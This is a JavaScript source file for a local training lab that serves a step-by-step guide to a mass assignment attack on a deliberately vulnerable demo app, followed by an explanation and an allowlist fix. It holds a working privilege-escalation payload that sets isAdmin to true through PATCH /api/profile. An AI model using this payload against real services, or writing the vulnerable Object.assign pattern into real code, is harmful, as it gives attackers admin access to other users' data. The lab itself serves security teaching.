/*
 * Terminal 2: cd demo-attacked/mass-assignment && npm run guide
 */

const express = require('express');

const app = express();
const PORT = 3047;
const VICTIM_PORT = 3046;
const PROTECTED_PORT = 3048;

const SWITCHER_CSS = `
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #16a34a;
      color: #fff;
      border-color: #16a34a;
    }
    .target-switcher .btn-protected.active {
      background: #15803d;
      color: #fff;
      border-color: #ef4444;
    }`;

const DASHBOARD_STYLE = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    ${SWITCHER_CSS}`;

const LAB_EXTRA_STYLE = `
    input.field, textarea.field {
      background: #111;
      border: 1px solid #1a3a1a;
      color: #00ff41;
      font-family: 'Courier New', Courier, monospace;
      font-size: 0.82rem;
      padding: 0.4rem 0.6rem;
      border-radius: 4px;
    }
    .result-banner {
      padding: 0.6rem 1rem;
      border-radius: 4px;
      font-size: 0.82rem;
      margin-top: 0.75rem;
      display: none;
    }
    .result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
    .result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
    .result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
    pre.decoded-box {
      background: #0a0a0a;
      border: 1px solid #1a3a1a;
      border-radius: 4px;
      padding: 0.75rem;
      font-size: 0.78rem;
      color: #cbd5e1;
      white-space: pre-wrap;
      word-break: break-all;
      margin-top: 0.5rem;
    }
    .step-block { margin-bottom: 1.25rem; }
    .step-block:last-child { margin-bottom: 0; }`;

function buildGuideHtml() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mass Assignment Attack Lab</title>
  <style>${DASHBOARD_STYLE}${LAB_EXTRA_STYLE}</style>
</head>
<body>
  <h1>🔑 Mass Assignment Attack Lab — ProfileHub</h1>
  <p class="subtitle">Object.assign(user, req.body) — any JSON field becomes writable</p>

  <div class="credentials-panel">
    <h2>Credentials</h2>
    <table>
      <thead><tr><th>Field</th><th>Value</th></tr></thead>
      <tbody>
        <tr><td>Target</td><td>http://localhost:${VICTIM_PORT}</td></tr>
        <tr><td>Username</td><td>alice / alice123</td></tr>
        <tr><td>Profile update</td><td>PATCH /api/profile</td></tr>
        <tr><td>Admin endpoint</td><td>GET /api/admin/users</td></tr>
      </tbody>
    </table>
  </div>

  <div class="flow-box">
    <strong>Login</strong><br><br>
    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap">
      <input class="field" id="login-user" value="alice" style="width:120px">
      <input class="field" id="login-pass" value="alice123" type="password" style="width:120px">
      <button class="demo-btn" id="btn-login">Login → :${VICTIM_PORT}</button>
    </div>
    <div class="result-banner" id="login-result"></div>
  </div>

  <div class="flow-box">
    <strong>Step-by-Step Attack</strong><br><br>

    <div class="step-block">
      <strong>Step 1 — Check current privileges</strong><br>
      <button class="demo-btn" id="btn-me" style="margin-top:0.5rem">GET /api/me</button>
      <div class="result-banner" id="me-result"></div>
      <pre class="decoded-box" id="me-output">Response will appear here</pre>
    </div>

    <div class="step-block">
      <strong>Step 2 — Update profile normally</strong><br>
      <pre class="decoded-box" style="margin-top:0.5rem">{ "bio": "Updated bio", "jobTitle": "Software Engineer" }</pre>
      <button class="demo-btn" id="btn-patch-normal">PATCH (normal)</button>
      <div class="result-banner" id="normal-result"></div>
      <pre class="decoded-box" id="normal-output"></pre>
    </div>

    <div class="step-block">
      <strong>Step 3 — Mass assign admin</strong><br>
      <pre class="decoded-box" style="margin-top:0.5rem">{ "bio": "Hacker was here", "isAdmin": true, "isPremium": true, "plan": "admin" }</pre>
      <button class="demo-btn" id="btn-patch-attack">PATCH (attack)</button>
      <div class="result-banner" id="attack-result"></div>
      <pre class="decoded-box" id="attack-output"></pre>
    </div>

    <div class="step-block">
      <strong>Step 4 — Access admin endpoint</strong><br>
      <button class="demo-btn" id="btn-admin" style="margin-top:0.5rem">GET /api/admin/users</button>
      <div class="result-banner" id="admin-result"></div>
      <pre class="decoded-box" id="admin-output">Response will appear here</pre>
    </div>
  </div>

  <div class="flow-box">
    <strong>Interactive Payload Builder</strong><br><br>
    <label style="font-size:0.82rem;color:#94a3b8">PATCH /api/profile — request body:</label>
    <textarea class="field" id="payload" rows="8" style="width:100%;font-family:monospace;font-size:0.85rem;margin-top:0.5rem">{
  "bio": "Hacker was here",
  "isAdmin": true,
  "isPremium": true,
  "plan": "admin"
}</textarea>
    <button class="demo-btn" id="btn-send" style="margin-top:0.75rem">Send PATCH request</button>
    <div class="result-banner" id="patch-result"></div>
    <pre class="decoded-box" id="patch-output">Response will appear here</pre>
  </div>

  <div class="flow-box">
    <strong>🔍 Why It Works</strong><br><br>
    <pre class="decoded-box">PATCH /api/profile request body:
  { "bio": "Hacker was here", "isAdmin": true }

Server code:
  Object.assign(req.user, req.body)

Object.assign merges ALL enumerable own properties from req.body
into req.user — including isAdmin, which was never meant to be
user-writable.

The developer intended to expose only: bio, jobTitle, company
They forgot that isAdmin lives on the same object and
Object.assign has no concept of read-only fields.

Express doesn't know which fields are safe — it just parses JSON.
Object.assign doesn't know which fields are safe — it just copies.
The developer must explicitly define the allowlist.</pre>
  </div>

  <div class="flow-box">
    <strong>✅ The Fix</strong><br><br>
    <pre class="decoded-box">// Explicit allowlist — only these fields may be changed by the user
const ALLOWED_PROFILE_FIELDS = ['bio', 'jobTitle', 'company', 'email'];

app.patch('/api/profile', requireAuth, (req, res) => {
  const update = {};
  for (const field of ALLOWED_PROFILE_FIELDS) {
    if (Object.prototype.hasOwnProperty.call(req.body, field)) {
      update[field] = req.body[field];
    }
  }
  Object.assign(req.user, update);
  res.json(publicUser(req.user));
});

Bonus — other mass assignment vectors:

ORM auto-binding (Mongoose):
  User.findByIdAndUpdate(id, req.body)
  User.findByIdAndUpdate(id, { $set: req.body })

Sequelize:
  user.update(req.body)

Django REST Framework:
  fields = '__all__'  // exposes is_staff, is_superuser

Rails:
  @user.update(params[:user])  // before strong parameters</pre>
  </div>

  <div class="target-switcher">
    <button type="button" class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (${VICTIM_PORT})</button>
    <button type="button" class="btn-protected" id="btn-switcher-protected">Protected (${PROTECTED_PORT})</button>
  </div>

  <script>
    var authToken = null;
    var currentUser = null;

    function showBanner(id, type, msg) {
      var el = document.getElementById(id);
      el.className = 'result-banner ' + type;
      el.textContent = msg;
      el.style.display = 'block';
    }

    function authHeaders(json) {
      var h = { 'Authorization': 'Bearer ' + authToken };
      if (json) h['Content-Type'] = 'application/json';
      return h;
    }

    document.getElementById('btn-login').addEventListener('click', async function() {
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: document.getElementById('login-user').value,
            password: document.getElementById('login-pass').value
          })
        });
        var data = await res.json();
        if (!res.ok) { showBanner('login-result', 'failure', '✗ ' + data.error); return; }
        authToken = data.token;
        currentUser = data.user;
        showBanner('login-result', 'success',
          '✓ Logged in as ' + data.user.username +
          ' | isAdmin: ' + data.user.isAdmin +
          ' | plan: ' + data.user.plan);
      } catch(e) { showBanner('login-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-me').addEventListener('click', async function() {
      if (!authToken) { showBanner('me-result', 'failure', '✗ Login first'); return; }
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/me', { headers: authHeaders() });
        var data = await res.json();
        document.getElementById('me-output').textContent = JSON.stringify(data, null, 2);
        showBanner('me-result', 'success', '✓ Current user state — isAdmin: ' + data.isAdmin);
      } catch(e) { showBanner('me-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-patch-normal').addEventListener('click', async function() {
      if (!authToken) { showBanner('normal-result', 'failure', '✗ Login first'); return; }
      var payload = { bio: 'Updated bio', jobTitle: 'Software Engineer' };
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/profile', {
          method: 'PATCH',
          headers: authHeaders(true),
          body: JSON.stringify(payload)
        });
        var data = await res.json();
        document.getElementById('normal-output').textContent = JSON.stringify(data, null, 2);
        showBanner('normal-result', 'success', '✓ Profile updated | isAdmin: ' + data.isAdmin);
      } catch(e) { showBanner('normal-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-patch-attack').addEventListener('click', async function() {
      if (!authToken) { showBanner('attack-result', 'failure', '✗ Login first'); return; }
      var payload = { bio: 'Hacker was here', isAdmin: true, isPremium: true, plan: 'admin' };
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/profile', {
          method: 'PATCH',
          headers: authHeaders(true),
          body: JSON.stringify(payload)
        });
        var data = await res.json();
        document.getElementById('attack-output').textContent = JSON.stringify(data, null, 2);
        if (data.isAdmin) {
          showBanner('attack-result', 'success', '✓ isAdmin: true — PRIVILEGE ESCALATION SUCCESSFUL');
        } else {
          showBanner('attack-result', 'success', '✓ Profile updated | isAdmin: ' + data.isAdmin);
        }
      } catch(e) { showBanner('attack-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-send').addEventListener('click', async function() {
      if (!authToken) { showBanner('patch-result', 'failure', '✗ Login first'); return; }
      var payload;
      try { payload = JSON.parse(document.getElementById('payload').value); }
      catch(e) { showBanner('patch-result', 'failure', '✗ Invalid JSON: ' + e.message); return; }
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/profile', {
          method: 'PATCH',
          headers: authHeaders(true),
          body: JSON.stringify(payload)
        });
        var data = await res.json();
        document.getElementById('patch-output').textContent = JSON.stringify(data, null, 2);
        if (data.isAdmin) {
          showBanner('patch-result', 'success', '✓ isAdmin: true — PRIVILEGE ESCALATION SUCCESSFUL');
        } else {
          showBanner('patch-result', 'success', '✓ Profile updated | isAdmin: ' + data.isAdmin);
        }
      } catch(e) { showBanner('patch-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-admin').addEventListener('click', async function() {
      if (!authToken) { showBanner('admin-result', 'failure', '✗ Login first'); return; }
      try {
        var res = await fetch('http://localhost:${VICTIM_PORT}/api/admin/users', { headers: authHeaders() });
        var data = await res.json();
        if (res.ok) {
          showBanner('admin-result', 'success', '✓ Admin access granted — all ' + data.length + ' users returned');
          document.getElementById('admin-output').textContent = JSON.stringify(data, null, 2);
        } else {
          showBanner('admin-result', 'failure', '✗ ' + data.error);
          document.getElementById('admin-output').textContent = '';
        }
      } catch(e) { showBanner('admin-result', 'failure', '✗ ' + e.message); }
    });

    document.getElementById('btn-switcher-vulnerable').addEventListener('click', function() {
      window.open('http://localhost:${VICTIM_PORT}', '_blank');
    });
    document.getElementById('btn-switcher-protected').addEventListener('click', function() {
      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
    });
  </script>
</body>
</html>`;
}

app.get('/', function (req, res) {
  res.send(buildGuideHtml());
});

app.listen(PORT, function () {
  console.log('Mass Assignment Attack Lab running at http://localhost:' + PORT);
});
